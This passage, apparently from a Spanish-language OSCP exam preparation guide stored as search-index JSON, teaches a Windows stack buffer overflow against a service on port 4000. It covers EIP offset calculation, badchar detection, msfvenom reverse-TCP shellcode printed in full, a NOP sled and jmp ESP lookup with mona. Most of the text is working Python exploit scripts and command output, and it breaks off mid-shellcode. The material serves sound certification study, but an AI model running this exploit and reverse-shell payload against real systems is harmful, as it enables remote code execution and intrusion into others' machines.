\"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9\"\n\nipAddress = sys.argv[1]\n\nport = 4000\n\ntry:\n  print \"Enviando b\u00faffer...\"\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.connect((ipAddress, port))\n  s.recv(1024)\n  s.send(\"USER \" + buffer + '\\r\\n')\n  s.recv(1024)\n  s.close()\nexcept:\n  print \"\\nError de conexi\u00f3n...\\n\"\n  sys.exit(0)\n</code></pre> <p>Lo que conseguimos con esto es determinar a trav\u00e9s del valor del registro EIP desde Immunity Debugger una vez se produce la violaci\u00f3n de segmento, qu\u00e9 caracteres est\u00e1n sobreescribiendo dicho registro.</p> <p>Supongamos que el registro EIP toma este valor tras la detenci\u00f3n del servicio una vez producido el desbordamiento:</p> <p>EIP -&gt; 39426230</p> <p>A fin de realizar su traducci\u00f3n y ver qu\u00e9 caracteres de nuestro b\u00faffer corresponden a estos valores, podemos aplicar el siguiente comando desde terminal:</p> <pre><code>$~ echo \"\\0x39\\0x42\\0x62\\0x30\" | xxd -ps -r\n\n9Bb0\n</code></pre> <p>Lo que hace que inmediatamente veamos los caracteres a los que corresponden dichos valores. Una vez identificados, podemos a trav\u00e9s del pattern_offset de Metasploit calcular el offset, permiti\u00e9ndonos as\u00ed conocer ya el tama\u00f1o del buffer previo a la sobreescritura del registro EIP:</p> <pre><code>$~ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 9Bb0\n\n[*] Exact match at offset 809\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#controlando-el-registro-eip","title":"Controlando el registro EIP","text":"<p>Conociendo ya el offset, podemos tomar el control del registro EIP. Dado que el registro EIP apunta a la siguiente direcci\u00f3n a ejecutar (pues dirige el flujo del programa), poder sobrescribir su valor es crucial para conseguir una ejecuci\u00f3n alternativa del servicio a nivel de sistema (lo veremos m\u00e1s adelante).</p> <p>Dado que el offset es 809, podemos crear el siguiente PoC a fin de verificar que tenemos el control del registro EIP:</p> <pre><code>#!/usr/bin/python\n# coding: utf-8\n\nimport sys,socket\n\nif len(sys.argv) != 2:\n  print \"\\nUso: python\" + sys.argv[0] + \" &lt;direcci\u00f3n-ip&gt;\\n\"\n  sys.exit(0)\n\nbuffer = \"A\"*809 + \"B\"*4 + \"C\"*(900-809-4)\n\nipAddress = sys.argv[1]\n\nport = 4000\n\ntry:\n  print \"Enviando b\u00faffer...\"\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.connect((ipAddress, port))\n  s.recv(1024)\n  s.send(\"USER \" + buffer + '\\r\\n')\n  s.recv(1024)\n  s.close()\nexcept:\n  print \"\\nError de conexi\u00f3n...\\n\"\n  sys.exit(0)\n</code></pre> <p>El caracter \"C\" lo meto como Padding para hacer relleno hasta llegar a los 900 (para trabajar con cifras redondas).</p> <p>Tras la ejecuci\u00f3n del script, desde el Immunity Debugger veremos que una vez se produce la violaci\u00f3n de segmento, el registro EIP toma el valor 42424242, equivalente a \"B\"*4. Llegados a este punto, es hora de encontrar el lugar en el que situar nuestro Shellcode.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#situando-y-asignando-espacio-al-shellcode","title":"Situando y Asignando Espacio al Shellcode","text":"<p>A la hora de hacer Padding con el caracter \"C\" tras sobrescribir previamente el registro EIP, podremos ver desde el Immunity Debugger como el registro ESP coincide con nuestro relleno. Llegados a este punto, para el caso que estamos tratando se podr\u00eda decir que nuestro shellcode tendr\u00eda que tener un total de 87 bytes, cosa que escapa de la realidad, pues en la mayor\u00eda de las veces para entablar una conexi\u00f3n reversa se generan un total de 351 bytes aproximadamente desde msfvenom.</p> <p>La idea aqu\u00ed, es rezar 2 padres nuestros para que tras ampliar considerablemente el relleno, el servicio no crashee de otra forma. En caso de \"crashing\" (vamos a llamarlo as\u00ed), si vemos que el registro EIP ya no vale lo que deber\u00eda, tendremos que ver hasta qu\u00e9 tama\u00f1o podemos hacer relleno sin que el servicio corrompa de otra manera alternativa.</p> <p>Hay casos como el de Linux que explicar\u00e9 donde s\u00f3lo contamos con 7 bytes de espacio. En ese caso la idea consiste en aprovechar estos 7 bytes para a trav\u00e9s de 5 bytes definir ciertas instrucciones de desplazamiento y salto entre registros, permiti\u00e9ndonos insertar nuestro Shellcode en un nuevo registro donde contamos con el espacio suficiente.</p> <p>Pero para el caso, y de cara a la examinaci\u00f3n... no habr\u00e1 que preocuparse. Modificamos para ello el script de la siguiente forma:</p> <pre><code>#!/usr/bin/python\n# coding: utf-8\n\nimport sys,socket\n\nif len(sys.argv) != 2:\n  print \"\\nUso: python\" + sys.argv[0] + \" &lt;direcci\u00f3n-ip&gt;\\n\"\n  sys.exit(0)\n\nbuffer = \"A\"*809 + \"B\"*4 + \"C\"*(1300-809-4)\n\nipAddress = sys.argv[1]\n\nport = 4000\n\ntry:\n  print \"Enviando b\u00faffer...\"\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.connect((ipAddress, port))\n  s.recv(1024)\n  s.send(\"USER \" + buffer + '\\r\\n')\n  s.recv(1024)\n  s.close()\nexcept:\n  print \"\\nError de conexi\u00f3n...\\n\"\n  sys.exit(0)\n</code></pre> <p>En este caso ampliamos de forma considerable nuestro relleno, donde tras sobrescribir el registro EIP, contamos con un total de 487 bytes de espacio donde los caracteres \"C\" ser\u00e1n situados. En caso de ver desde Immunity Debugger que todo figura como lo esperado, podremos quedarnos tranquilos, pues tenemos espacio suficiente para depositar nuestro Shellcode sobre el registro ESP.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#detectando-los-badchars","title":"Detectando los Badchars","text":"<p>Esta ser\u00e1 la \u00fanica complicaci\u00f3n del examen, y cuando digo complicaci\u00f3n la sit\u00fao entre comillas gestualmente hablando. </p> <p>A la hora de generar nuestro Shellcode, existen ciertos caracteres que en funci\u00f3n del servicio con el que estemos tratando no son aceptados, causando una ejecuci\u00f3n err\u00f3nea de las instrucciones que pretendamos inyectar a nivel de sistema.</p> <p>Detectar estos caracteres no es nada complejo, lo \u00fanico que necesitamos es una estructura como la siguiente:</p> <p><code>\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"</code></p> <p>A fin de detectar cu\u00e1les de estos caracteres no son aceptados por el servicio, configuramos nuestro script de la siguiente forma:</p> <pre><code>#!/usr/bin/python\n# coding: utf-8\n\nimport sys,socket\n\nif len(sys.argv) != 2:\n  print \"\\nUso: python\" + sys.argv[0] + \" &lt;direcci\u00f3n-ip&gt;\\n\"\n  sys.exit(0)\n\nbadchars = (\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")\n\nbuffer = \"A\"*809 + \"B\"*4 + badchars + \"C\"*(1300-809-4-255)\n\nipAddress = sys.argv[1]\n\nport = 4000\n\ntry:\n  print \"Enviando b\u00faffer...\"\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.connect((ipAddress, port))\n  s.recv(1024)\n  s.send(\"USER \" + buffer + '\\r\\n')\n  s.recv(1024)\n  s.close()\nexcept:\n  print \"\\nError de conexi\u00f3n...\\n\"\n  sys.exit(0)\n</code></pre> <p>Desde Immunity Debugger, tras la ejecuci\u00f3n del script podremos ver una vez se produce el desbordamiento del b\u00fafer los valores que est\u00e1n siendo depositados sobre el registro ESP, correspondiente a nuestros badchars. La idea aqu\u00ed es caracter que no veamos, caracter que debemos desechar en el env\u00edo de nuestros badchars.</p> <p>Generalmente, los caracteres \\x0a y \\x0d suelen ser badchars, pero pueden var\u00edan en funci\u00f3n del servicio que estemos utilizando. Algo importante a tener en cuenta es el caracter \\x00, badchar que por norma general no suele ser incluido de forma visual en la estructura de badchars, pues es gen\u00e9rico y siempre debe ser omitido a la hora de generar nuestro Shellcode.</p> <p>Suponiendo que hemos detectado que los badchars para este caso son \\x00\\x0a\\x0d, lo \u00fanico que nos queda ya es generar nuestro Shellcode. </p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#generando-el-shellcode","title":"Generando el Shellcode","text":"<p>El shellcode que se generar\u00e1 a continuaci\u00f3n, lo que nos har\u00e1 ser\u00e1 entablar una conexi\u00f3n TCP reversa contra el equipo. Para ello, seguimos la siguiente sintaxis:</p> <pre><code>$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 -a x86 --platform windows -b \"\\x00\\x0a\\x0d\" -e x86/shikata_ga_nai -f c\n\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 351 (iteration=0)\nx86/shikata_ga_nai chosen with final size 351\nPayload size: 351 bytes\nFinal size of c file: 1500 bytes\nunsigned char buf[] = \n\"\\xba\\xfc\\xb2\\xc0\\x24\\xdb\\xd3\\xd9\\x74\\x24\\xf4\\x5f\\x2b\\xc9\\xb1\"\n\"\\x52\\x83\\xc7\\x04\\x31\\x57\\x0e\\x03\\xab\\xbc\\x22\\xd1\\xaf\\x29\\x20\"\n\"\\x1a\\x4f\\xaa\\x45\\x92\\xaa\\x9b\\x45\\xc0\\xbf\\x8c\\x75\\x82\\xed\\x20\"\n\"\\xfd\\xc6\\x05\\xb2\\x73\\xcf\\x2a\\x73\\x39\\x29\\x05\\x84\\x12\\x09\\x04\"\n\"\\x06\\x69\\x5e\\xe6\\x37\\xa2\\x93\\xe7\\x70\\xdf\\x5e\\xb5\\x29\\xab\\xcd\"\n\"\\x29\\x5d\\xe1\\xcd\\xc2\\x2d\\xe7\\x55\\x37\\xe5\\x06\\x77\\xe6\\x7d\\x51\"\n\"\\x57\\x09\\x51\\xe9\\xde\\x11\\xb6\\xd4\\xa9\\xaa\\x0c\\xa2\\x2b\\x7a\\x5d\"\n\"\\x4b\\x87\\x43\\x51\\xbe\\xd9\\x84\\x56\\x21\\xac\\xfc\\xa4\\xdc\\xb7\\x3b\"\n\"\\xd6\\x3a\\x3d\\xdf\\x70\\xc8\\xe5\\x3b\\x80\\x1d\\x73\\xc8\\x8e\\xea\\xf7\"\n\"\\x96\\x92\\xed\\xd4\\xad\\xaf\\x66\\xdb\\x61\\x26\\x3c\\xf8\\xa5\\x62\\xe6\"\n\"\\x61\\xfc\\xce\\x49\\x9d\\x1e\\xb1\\x36\\x3b\\x55\\x5c\\x22\\x36\\x34\\x09\"\n\"\\x87\\x7b\\xc6\\xc9\\x8f\\x0c\\xb5\\xfb\\x10\\xa7\\x51\\xb0\\xd9\\x61\\xa6\"\n\"\\xb7\\xf3\\xd6\\x38\\x46\\xfc\\x26\\x11\\x8d\\xa8\\x76\\x09\\x24\\xd1\\x1c\"\n\"\\xc9\\xc9\\x04\\xb2\\x99\\x65\\xf7\\x73\\x49\\xc6\\xa7\\x1b\\x83\\xc9\\x98\"\n\"\\x3c\\xac\\x03\\xb1\\xd7\\x57\\xc4\\xc1\\x27\\x57\\x15\\x56\\x2a\\x57\\x14\"\n\"\\x1d\\xa3\\xb1\\x7c\\x71\\xe2\\x6a\\xe9\\xe8\\xaf\\xe0\\x88\\xf5\\x65\\x8d\"\n\"\\x8b\\x7e\\x8a\\x72\\x45\\x77\\xe7\\x60\\x32\\x77\\xb2\\xda\\x95\\x88\\x68\"\n\"\\x72\\x79\\x1a\\xf7\\x82\\xf4\\x07\\xa0\\xd5\\x51\\xf9\\xb9\\xb3\\x4f\\xa0\"\n\"\\x13\\xa1\\x8d\\x34\\x5b\\x61\\x4a\\x85\\x62\\x68\\x1f\\xb1\\x40\\x7a\\xd9\"\n\"\\x3a\\xcd\\x2e\\xb5\\x6c\\x9b\\x98\\x73\\xc7\\x6d\\x72\\x2a\\xb4\\x27\\x12\"\n\"\\xab\\xf6\\xf7\\x64\\xb4\\xd2\\x81\\x88\\x05\\x8b\\xd7\\xb7\\xaa\\x5b\\xd0\"\n\"\\xc0\\xd6\\xfb\\x1f\\x1b\\x53\\x0b\\x6a\\x01\\xf2\\x84\\x33\\xd0\\x46\\xc9\"\n\"\\xc3\\x0f\\x84\\xf4\\x47\\xa5\\x75\\x03\\x57\\xcc\\x70\\x4f\\xdf\\x3d\\x09\"\n\"\\xc0\\x8a\\x41\\xbe\\xe1\\x9e\"\n</code></pre> <p>Una vez generado el shellcode, lo a\u00f1adimos a nuestro script de la siguiente forma:</p> <pre><code>#!/usr/bin/python\n# coding: utf-8\n\nimport sys,socket\n\nif len(sys.argv) != 2:\n  print \"\\nUso: python\" + sys.argv[0] + \" &lt;direcci\u00f3n-ip&gt;\\n\"\n  sys.exit(0)\n\nshellcode = (\"\\xba\\xfc\\xb2\\xc0\\x24\\xdb\\xd3\\xd9\\x74\\x24\\xf4\\x5f\\x2b\\xc9\\xb1\"\n\"\\x52\\x83\\xc7\\x04\\x31\\x57\\x0e\\x03\\xab\\xbc\\x22\\xd1\\xaf\\x29\\x20\"\n\"\\x1a\\x4f\\xaa\\x45\\x92\\xaa\\x9b\\x45\\xc0\\xbf\\x8c\\x75\\x82\\xed\\x20\"\n\"\\xfd\\xc6\\x05\\xb2\\x73\\xcf\\x2a\\x73\\x39\\x29\\x05\\x84\\x12\\x09\\x04\"\n\"\\x06\\x69\\x5e\\xe6\\x37\\xa2\\x93\\xe7\\x70\\xdf\\x5e\\xb5\\x29\\xab\\xcd\"\n\"\\x29\\x5d\\xe1\\xcd\\xc2\\x2d\\xe7\\x55\\x37\\xe5\\x06\\x77\\xe6\\x7d\\x51\"\n\"\\x57\\x09\\x51\\xe9\\xde\\x11\\xb6\\xd4\\xa9\\xaa\\x0c\\xa2\\x2b\\x7a\\x5d\"\n\"\\x4b\\x87\\x43\\x51\\xbe\\xd9\\x84\\x56\\x21\\xac\\xfc\\xa4\\xdc\\xb7\\x3b\"\n\"\\xd6\\x3a\\x3d\\xdf\\x70\\xc8\\xe5\\x3b\\x80\\x1d\\x73\\xc8\\x8e\\xea\\xf7\"\n\"\\x96\\x92\\xed\\xd4\\xad\\xaf\\x66\\xdb\\x61\\x26\\x3c\\xf8\\xa5\\x62\\xe6\"\n\"\\x61\\xfc\\xce\\x49\\x9d\\x1e\\xb1\\x36\\x3b\\x55\\x5c\\x22\\x36\\x34\\x09\"\n\"\\x87\\x7b\\xc6\\xc9\\x8f\\x0c\\xb5\\xfb\\x10\\xa7\\x51\\xb0\\xd9\\x61\\xa6\"\n\"\\xb7\\xf3\\xd6\\x38\\x46\\xfc\\x26\\x11\\x8d\\xa8\\x76\\x09\\x24\\xd1\\x1c\"\n\"\\xc9\\xc9\\x04\\xb2\\x99\\x65\\xf7\\x73\\x49\\xc6\\xa7\\x1b\\x83\\xc9\\x98\"\n\"\\x3c\\xac\\x03\\xb1\\xd7\\x57\\xc4\\xc1\\x27\\x57\\x15\\x56\\x2a\\x57\\x14\"\n\"\\x1d\\xa3\\xb1\\x7c\\x71\\xe2\\x6a\\xe9\\xe8\\xaf\\xe0\\x88\\xf5\\x65\\x8d\"\n\"\\x8b\\x7e\\x8a\\x72\\x45\\x77\\xe7\\x60\\x32\\x77\\xb2\\xda\\x95\\x88\\x68\"\n\"\\x72\\x79\\x1a\\xf7\\x82\\xf4\\x07\\xa0\\xd5\\x51\\xf9\\xb9\\xb3\\x4f\\xa0\"\n\"\\x13\\xa1\\x8d\\x34\\x5b\\x61\\x4a\\x85\\x62\\x68\\x1f\\xb1\\x40\\x7a\\xd9\"\n\"\\x3a\\xcd\\x2e\\xb5\\x6c\\x9b\\x98\\x73\\xc7\\x6d\\x72\\x2a\\xb4\\x27\\x12\"\n\"\\xab\\xf6\\xf7\\x64\\xb4\\xd2\\x81\\x88\\x05\\x8b\\xd7\\xb7\\xaa\\x5b\\xd0\"\n\"\\xc0\\xd6\\xfb\\x1f\\x1b\\x53\\x0b\\x6a\\x01\\xf2\\x84\\x33\\xd0\\x46\\xc9\"\n\"\\xc3\\x0f\\x84\\xf4\\x47\\xa5\\x75\\x03\\x57\\xcc\\x70\\x4f\\xdf\\x3d\\x09\"\n\"\\xc0\\x8a\\x41\\xbe\\xe1\\x9e\")\n\nbuffer = \"A\"*809 + \"B\"*4 + \"\\x90\"*16 + shellcode + \"C\"*(1300-809-4-16-351)\n\nipAddress = sys.argv[1]\n\nport = 4000\n\ntry:\n  print \"Enviando b\u00faffer...\"\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.connect((ipAddress, port))\n  s.recv(1024)\n  s.send(\"USER \" + buffer + '\\r\\n')\n  s.recv(1024)\n  s.close()\nexcept:\n  print \"\\nError de conexi\u00f3n...\\n\"\n  sys.exit(0)\n</code></pre> <p>La raz\u00f3n por la cual se han insertado los NOP-sled (\\x90) antes de nuestro Shellcode, es porque el Shellcode necesita un margen de espacio para ser decodificado antes de ser interpretado, pues hemos usado el encoder x86/shikata_ga_nai. Una buena practica es aprovechar el Immunity Debugger para analizar instrucci\u00f3n a instrucci\u00f3n c\u00f3mo se va produciendo el proceso de decodificaci\u00f3n, as\u00ed como probar a no insertar los NOP-sled a fin de corroborar como la ejecuci\u00f3n de nuestro Shellcode no es funcional.</p> <p>Ya teniendo todo esto hecho, lo \u00fanico que queda es encontrar una direcci\u00f3n de salto al registro ESP.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#salto-al-esp","title":"Salto al ESP","text":"<p>Llegando casi al final, para redirigir el flujo del programa y conseguir una ejecuci\u00f3n exitosa de nuestro Shellcode, dado que nuestro Shellcode se sit\u00faa en el registro ESP por un lado y dado que tenemos el control del registro EIP por otro... la idea es hacer que el registro EIP apunte hacia el registro ESP.</p> <p>Para ello, no es tan simple como especificar en Little Endian la direcci\u00f3n del registro ESP, pues no funcionar\u00e1. Lo que tendremos que hacer es lograr que el registro EIP apunte hacia una direcci\u00f3n de la memoria con permisos de ejecuci\u00f3n y ASLR desactivado donde se aplique una instrucci\u00f3n de tipo 'jmp ESP'. De esta forma, conseguiremos tras apuntar a dicha direcci\u00f3n, que la siguiente instrucci\u00f3n a realizar corresponda a los NOP's iniciales del registro ESP hasta llegar a nuestro Shellcode.</p> <p>Para ello, lo que tendremos que hacer una vez sincronizados al proceso desde Immunity Debugger, es aplicar el siguiente comando en la l\u00ednea de comandos interactiva de la herramienta:</p> <p><code>!mona modules</code></p> <p>Una vez hecho, se nos listar\u00e1n un pu\u00f1ado de m\u00f3dulos, de entre los cuales deberemos buscar cu\u00e1les no poseen mecanismos de protecci\u00f3n y tienen el ASLR desactivado. Para la examinaci\u00f3n del OSCP, siempre habr\u00e1 uno que re\u00fana dichas condiciones.</p> <p>Tras encontrar el m\u00f3dulo, desde las pesta\u00f1as superiores en Immunity Debugger (las letras iniciales), una de ellas nos permite visualizar si el campo .text del m\u00f3dulo en la memoria tiene permisos de ejecuci\u00f3n, en caso de ser as\u00ed, el m\u00f3dulo seleccionado es un candidato perfecto.</p> <p>La idea una vez teniendo el m\u00f3dulo candidato, es ver en qu\u00e9 porci\u00f3n de la memoria se est\u00e1 aplicando un salto al registro ESP. Para realizar esta b\u00fasqueda, analizamos el equivalente OPCode de la instrucci\u00f3n haciendo uso para ello de la utilidad nasm_shell.rb de Metasploit:</p> <pre><code>$~ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb\n\nnasm &gt; jmp esp\n00000000  FFE4              jmp esp\nnasm &gt;\n</code></pre> <p>Sabiendo que a nivel de OPCode, un 'jmp ESP' figura como FFE4, podemos a continuaci\u00f3n desde Mona en la l\u00ednea de comandos interactiva de Immunity Debugger realizar la siguiente consulta en la secci\u00f3n de m\u00f3dulos:</p> <p><code>find -s \"\\xff\\xe4\" -m modulo.dll</code></p> <p>Suponiendo que se trata de una dll el m\u00f3dulo candidato que hemos encontrado. De manera inmediata, se nos datar\u00e1n un listado de resultados, donde de entre ellos... deberemos seleccionar aquel cuya direcci\u00f3n de memoria no posea badchars.</p> <p>Haciendo doble-click en la misma, podremos ver desde la interfaz principal de Immunity Debugger como dicha direcci\u00f3n equivale a un jmp ESP. A modo de ejemplo, suponiendo que la direcci\u00f3n es 0x12131415, se deber\u00edan de aplicar al script los siguientes cambios:</p> <pre><code>#!/usr/bin/python\n# coding: utf-8\n\nimport sys,socket\n\nif len(sys.argv) != 2:\n  print \"\\nUso: python\" + sys.argv[0] + \" &lt;direcci\u00f3n-ip&gt;\\n\"\n  sys.exit(0)\n\nshellcode = (\"\\xba\\xfc\\xb2\\xc0\\x24\\xdb\\xd3\\xd9\\x74\\x24\\xf4\\x5f\\x2b\\xc9\\xb1\"\n\"\\x52\\x83\\xc7\\x04\\x31\\x57\\x0e\\x03\\xab\\xbc\\x22\\xd1\\xaf\\x29\\x20\"\n\"\\x1a\\x4f\\xaa\\x45\\x92\\xaa\\x9b\\x45\\xc0\\xbf\\x8c\\x75\\x82\\xed\\x20\"\n\"\\xfd\\xc6\\x05\\xb2\\x73\\xcf\\x2a\\x73\\x39\\x29\\x05\\x84\\x12\\x09\\x04\"\n\"\\x06\\x69\\x5e\\xe6\\x37\\xa2\\x93\\xe7\\x70\\xdf\\x5e\\xb5\\x29\\xab\\xcd\"\n\"\\x29\\x5d\\xe1\\xcd\\xc2\\x2d\\xe7\\x55\\x37\\xe5\\x06\\x77\\xe6\\x7d\\x51\"\n\"\\x57\\x09\\x51\\xe9\\xde\\x11\\xb6\\xd4\\xa9\\xaa\\x0c\\xa2\\x2b\\x7a\\x5d\"\n\"\\x4b\\x87\\x43\\x51\\xbe\\xd9\\x84\\x56\\x21\\xac\\xfc\\xa4\\xdc\\xb7\\x3b\"\n\"\\xd6\\x3a\\x3d\\xdf\\x70\\xc8\\xe5\\x3b\\x80\\x1d\\x73\\xc8\\x8e\\xea\\xf7\"\n\"\\x96\\x92\\xed\\xd4\\xad\\xaf\\x66\\xdb\\x61\\x26\\x3c\\xf8\\xa5\\x62\\xe6\"\n\"\\x61\\xfc\\xce\\x49\\x9d\\x1e\\xb1\\x36\\x3b\\x55\\x5c\\x22\\x36\\x34\\x09\"\n\"\\x87\\x7b\\xc6\\xc9\\x8f\\x0c\\xb5\\xfb\\x10\\xa7\\x51\\xb0\\xd9\\x61\\xa6\"\n\"\\xb7\\xf3\\xd6\\x38\\x46\\xfc\\x26\\x11\\x8d\\xa8\\x76\\x09\\x24\\xd1\\x1c\"\n\"\\xc9\\xc9\\x04\\xb2\\x99\\x65\\xf7\\x73\\x49\\xc6\\xa7\\x1b\\x83\\xc9\\x98\"\n\"\\x3c\\xac\\x03\\xb1\\xd7\\x57\\xc4\\xc1\\x27\\x57\\x15\\x56\\x2a\\x57\\x14\"\n\"\\x1d\\xa3\\xb1\\x7c\\x71\\xe2\\x6a\\xe9\\xe8\\xaf\\xe0\\x88\\xf5\\x65\\x8d\"\n\"\\x8b\\x7e\\x8a\\x72\\x45\\x77\\xe7\\x60\\x32\\x77\\xb2\\xda\\x95\\x88\\x68\"\n\"\\x72\\x79\\x1a\\xf7\\x82\\xf4\\x07\\xa0\\xd5\\x51\\xf9\\xb9\\xb3\\x4f\